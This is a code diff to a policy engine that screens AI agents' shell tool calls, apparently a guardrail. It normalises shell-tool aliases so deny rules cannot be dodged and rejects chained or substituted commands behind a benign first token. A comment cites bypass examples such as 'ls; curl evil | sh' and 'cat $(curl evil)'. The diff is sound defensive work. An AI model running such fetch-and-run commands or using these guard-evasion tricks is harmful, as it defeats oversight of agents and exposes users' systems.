@@ -50,7 +50,9 @@ logger = logging.getLogger(__name__)
 __all__ = [
     "BENIGN_COMMANDS",
     "BENIGN_GIT_SUBCOMMANDS",
+    "COMMAND_SINK_TOOLS",
     "command_safety_check",
+    "is_command_sink",
     "EvaluationResult",
     "evaluate_condition",
     "PolicyEngine",
@@ -137,8 +139,92 @@ BENIGN_GIT_SUBCOMMANDS: set[str] = {
 }
 
 
+# ---------------------------------------------------------------------------
+# Command-sink tool aliasing
+# ---------------------------------------------------------------------------
+# The shipped policy presets express their command rules with
+# ``tool_pattern: terminal`` (exfil-regex DENY, dangerous-command DENY, benign
+# whitelist, …). Without normalization, a runtime that names its shell tool
+# ``bash``/``shell``/``run_command``/``subprocess``/``exec``/``powershell``
+# would bypass ALL of those rules and the dangerous-command pre-check. We
+# canonicalize every command-sink alias to ``terminal`` for matching.
+#
+# NOTE: ``execute_code`` is deliberately NOT in this set — it is a distinct
+# sink with its own ``execute_code`` policy rules; folding it into ``terminal``
+# would strip its dedicated handling.
+COMMAND_SINK_TOOLS: frozenset[str] = frozenset(
+    {
+        "terminal",
+        "bash",
+        "shell",
+        "sh",
+        "zsh",
+        "fish",
+        "run_command",
+        "run_terminal_cmd",
+        "runcommand",
+        "run_shell_command",
+        "subprocess",
+        "exec",
+        "execute_command",
+        "execute_bash",
+        "command",
+        "cmd",
+        "powershell",
+        "pwsh",
+        "system",
+        "os_system",
+    }
+)
+
+# Substrings that unambiguously denote a shell sink (do NOT include "exec" or a
+# bare "code" — they would mis-capture ``execute_code``).
+_COMMAND_SINK_SUBSTR: tuple[str, ...] = (
+    "terminal",
+    "shell",
+    "bash",
+    "subprocess",
+    "powershell",
+    "run_command",
+)
+
+# Argument keys that commonly carry the command string for a command-sink tool.
+_COMMAND_ARG_KEYS: tuple[str, ...] = ("command", "cmd", "script", "input")
+
+
+def is_command_sink(tool_name: str) -> bool:
+    """Return True if *tool_name* executes shell/OS commands (any known alias)."""
+    t = (tool_name or "").lower().strip()
+    if not t:
+        return False
+    if t in COMMAND_SINK_TOOLS:
+        return True
+    return any(sub in t for sub in _COMMAND_SINK_SUBSTR)
+
+
+def _canonical_tool_name(tool_name: str) -> str:
+    """Map command-sink aliases to ``terminal`` for policy matching."""
+    return "terminal" if is_command_sink(tool_name) else tool_name
+
+
+def _extract_command_arg(args: dict[str, Any]) -> Any | None:
+    """Return the command string from a command-sink call's args, if present."""
+    for key in _COMMAND_ARG_KEYS:
+        if key in args and args[key] is not None:
+            return args[key]
+    return None
+
+
+# Shell metacharacters that chain or substitute commands. A "benign" check that
+# only inspects the first token is trivially defeated by `ls; curl evil | sh`
+# or `cat $(curl evil)`, so we split on these and require EVERY segment benign,
+# and reject command/process substitution outright for tainted input.
+_SHELL_SEGMENT_SPLIT = re.compile(r";|&&|\|\||\||\n|&")
+_COMMAND_SUBSTITUTION = re.compile(r"\$\(|\$\{|`|<\(|>\(")
+
+
 def _extract_base_command(command: str) -> str:
-    """Extract the base command name from a shell command string."""
+    """Extract the base command name from a single shell command segment."""
     cmd = command.strip()
     # Strip leading env vars like FOO=bar cmd
     while "=" in cmd.split()[0] if cmd.split() else False:
@@ -148,28 +234,48 @@ def _extract_base_command(command: str) -> str:
     if cmd.startswith("sudo "):
         cmd = cmd[5:].strip()
     base = cmd.split()[0] if cmd.split() else ""
-    # Strip path prefix
+    # Strip path prefix (handle both / and \ separators)
+    base = base.replace("\\", "/")
     if "/" in base:
         base = base.rsplit("/", 1)[-1]
     return base
 
 
-def _is_benign_command(command: str) -> bool:
-    """Check if a command is benign (safe even with mild taint)."""
-    base = _extract_base_command(command)
+def _segment_is_benign(segment: str) -> bool:
+    """Check whether a single command segment (no separators) is benign."""
+    base = _extract_base_command(segment)
     if not base:
         return False
-    if base in BENIGN_COMMANDS:
-        # Special check for git — only safe subcommands
-        if base == "git":
-            parts = command.strip().split()
-            git_idx = next((i for i, p in enumerate(parts) if p == "git" or p.endswith("/git")), -1)
-            if git_idx >= 0 and git_idx + 1 < len(parts):
-                subcmd = parts[git_idx + 1]
-                return subcmd in BENIGN_GIT_SUBCOMMANDS
-            return True  # bare 'git' is fine
-        return True
-    return False
+    if base not in BENIGN_COMMANDS:
+        return False
+    # Special check for git — only read-only subcommands are benign
+    if base == "git":
+        parts = segment.strip().split()
+        git_idx = next((i for i, p in enumerate(parts) if p == "git" or p.endswith("/git")), -1)
+        if git_idx >= 0 and git_idx + 1 < len(parts):
+            return parts[git_idx + 1] in BENIGN_GIT_SUBCOMMANDS
+        return True  # bare 'git' is fine
+    return True
+
+
+def _is_benign_command(command: str) -> bool:
+    """Check if a command is benign (safe even with mild taint).
+
+    A command is benign only when it contains no command/process substitution
+    and *every* chained segment (split on ``; && || | & \\n``) is itself a
+    benign base command. This closes the first-token bypass where a benign
+    prefix smuggles a dangerous command behind a separator or substitution.
+    """
+    if not command or not command.strip():
+        return False
+    # Command/process substitution can run arbitrary commands whose output is
+    # spliced in — never benign.
+    if _COMMAND_SUBSTITUTION.search(command):
+        return False
+    segments = [seg for seg in _SHELL_SEGMENT_SPLIT.split(command) if seg.strip()]
+    if not segments:
+        return False
+    return all(_segment_is_benign(seg) for seg in segments)
 
 
 def command_safety_check(
@@ -310,16 +416,35 @@ def _field_labels(taint_context: dict[str, Any], field_name: str) -> set[str]:
     return labels
 
 
+# Severity assigned to a tainted field whose numeric level is missing/invalid.
+# Treated as maximum (fail closed): an unknown-severity tainted value must not
+# silently slip under the gradient DENY threshold or qualify for a benign-ALLOW.
+_UNKNOWN_TAINT_LEVEL = 10
+
+
 def _field_level(taint_context: dict[str, Any], field_name: str) -> int:
-    """Return the maximum taint level for *field_name* (or all if '*')."""
+    """Return the maximum taint level for *field_name* (or all if '*').
+
+    A field that is tainted but carries no usable ``level`` is treated as
+    maximum severity (``_UNKNOWN_TAINT_LEVEL``) rather than 0. Defaulting to 0
+    was fail-open: it disabled every ``taint_level_gte`` DENY and let tainted
+    input qualify for ``taint_level_lte`` benign-ALLOW rules.
+    """
     tainted_fields = taint_context.get("tainted_fields", {})
     levels: list[int] = []
 
     targets = tainted_fields.values() if field_name == "*" else [tainted_fields.get(field_name, {})]
     for info in targets:
-        lvl = info.get("level", 0)
+        if not info:
+            continue
+        lvl = info.get("level")
+        if isinstance(lvl, bool):  # bool is an int subclass — reject it as invalid
+            lvl = None
         if isinstance(lvl, int):
             levels.append(lvl)
+        elif info.get("is_tainted"):
+            # Tainted field with no/invalid level → assume worst case.
+            levels.append(_UNKNOWN_TAINT_LEVEL)
     return max(levels) if levels else 0
 
 
@@ -748,22 +873,32 @@ class PolicyEngine:
         if cached is not None:
             return cached
 
-        # Command safety pre-check for terminal calls
-        if tool_name == "terminal" and "command" in args:
-            safety = command_safety_check(args["command"], taint_context)
-            if safety == PolicyResult.DENY:
-                result = EvaluationResult(
-                    action=PolicyResult.DENY,
-                    matched_policy=None,
-                    reason=("command_safety_check denied terminal call: dangerous command with tainted args"),
-                    details={
-                        "tool_name": tool_name,
-                        "policy_set": self._policy_set_name,
-                        "safety_check": "dangerous_tainted",
-                    },
-                )
-                self._cache_put(cache_key, result)
-                return result
+        # Command safety pre-check for any command-sink tool (terminal, bash,
+        # shell, run_command, subprocess, exec, powershell, …).
+        if is_command_sink(tool_name):
+            command_value = _extract_command_arg(args)
+            if command_value is not None:
+                safety = command_safety_check(str(command_value), taint_context)
+                if safety == PolicyResult.DENY:
+                    result = EvaluationResult(
+                        action=PolicyResult.DENY,
+                        matched_policy=None,
+                        reason=(
+                            f"command_safety_check denied command-sink call '{tool_name}': "
+                            "dangerous command with tainted args"
+                        ),
+                        details={
+                            "tool_name": tool_name,
+                            "policy_set": self._policy_set_name,
+                            "safety_check": "dangerous_tainted",
+                        },
+                    )
+                    self._cache_put(cache_key, result)
+                    return result
+
+        # Canonicalize command-sink aliases to "terminal" so the shipped
+        # `tool_pattern: terminal` rules cover bash/shell/subprocess/etc.
+        match_name = _canonical_tool_name(tool_name)
 
         # Snapshot policies under the lock, then evaluate without holding it
         # (GAP 4.3 — thread safety: atomic snapshot for evaluate)
@@ -774,8 +909,8 @@ class PolicyEngine:
             if not policy.enabled:
                 continue
 
-            # Tool-name glob match
-            if not fnmatch.fnmatch(tool_name, policy.tool_pattern):
+            # Tool-name glob match (command-sink aliases matched as "terminal")
+            if not fnmatch.fnmatch(match_name, policy.tool_pattern):
                 continue
 
             # Evaluate all conditions (implicit AND)
